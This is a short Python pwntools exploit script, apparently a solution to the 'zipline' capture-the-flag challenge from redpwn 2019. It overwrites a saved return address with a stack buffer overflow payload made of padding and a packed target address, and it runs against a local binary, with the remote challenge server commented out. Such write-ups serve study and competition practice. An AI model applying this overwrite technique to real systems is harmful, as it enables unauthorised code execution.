#coding=utf-8
from pwn import *

zipline = 0x8049564
target =  0x80a0196
main = 0x080494f6
gets = 0x80494e8
stack = 0xffffd556
ret = 0xffffd56c

#r = remote('chall.2019.redpwn.net', 4005)
r = process('./zipline')
payload = 'a' * (ret - stack) + p32(target)
r.sendlineafter('hell?', payload)
print r.recvall(2)
